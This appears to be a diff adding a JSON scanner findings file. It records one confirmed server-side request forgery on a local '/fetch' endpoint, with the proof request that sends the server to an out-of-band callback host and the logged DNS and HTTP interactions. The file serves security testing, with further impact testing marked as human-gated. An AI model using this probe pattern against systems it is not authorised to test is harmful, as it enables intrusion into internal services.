@@ -1,0 +1,29 @@
+[
+  {
+    "class": "ssrf",
+    "severity": "high",
+    "endpoint": "http://127.0.0.1:8188/fetch",
+    "param": "url",
+    "proof_request": "GET http://127.0.0.1:8188/fetch?url=http%3A%2F%2Fs9dbeb03792.dc2bratafvslvrhrgg7g3d9c6ddw1iyf5.oast.site%2Fs9dbeb03792",
+    "validated_by": "out-of-band interaction (target server contacted our OOB listener)",
+    "oob_provider": "InteractshOOB",
+    "proof_interactions": [
+      {
+        "protocol": "dns",
+        "full-id": "s9dbeb03792.dc2bratafvslvrhrgg7g3d9c6ddw1iyf5",
+        "q-type": "A",
+        "remote-address": "185.141.119.131",
+        "timestamp": "2026-11-23T22:26:57.692894127Z"
+      },
+      {
+        "protocol": "http",
+        "full-id": "s9dbeb03792.dc2bratafvslvrhrgg7g3d9c6ddw1iyf5",
+        "q-type": null,
+        "remote-address": "185.141.119.152",
+        "timestamp": "2026-11-23T22:26:58.321142377Z"
+      }
+    ],
+    "confirmed": true,
+    "note": "PROOF of SSRF only - internal/metadata impact is human-gated"
+  }
+]
